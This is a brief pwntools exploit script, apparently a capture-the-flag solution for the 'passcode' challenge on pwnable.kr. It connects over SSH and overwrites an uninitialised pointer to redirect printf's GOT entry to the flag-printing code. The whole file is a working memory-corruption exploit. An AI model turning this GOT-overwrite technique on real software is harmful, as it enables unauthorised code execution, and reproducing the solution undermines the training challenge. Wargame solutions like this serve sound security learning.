from pwn import *

host = "pwnable.kr"
port = 2222
user = "passcode"
password = "guest"
binary = "/home/passcode/passcode"

off_name = -0x70
off_passcode1 = -0x10
addr_call_cat_flag = 0x080485E3

shell = ssh(host=host, port=port, user=user, password=password)
shell.download_file(binary)
e = ELF("passcode")
got_printf = e.got["printf"]
r = shell.run( binary )
r.recvuntil("enter you name : ")
r.sendline( cyclic(off_passcode1-off_name) + p32(got_printf) )
r.recvuntil("enter passcode1 : ")
r.sendline( str(addr_call_cat_flag) )
flag = r.recvall()
print flag
shell.close()
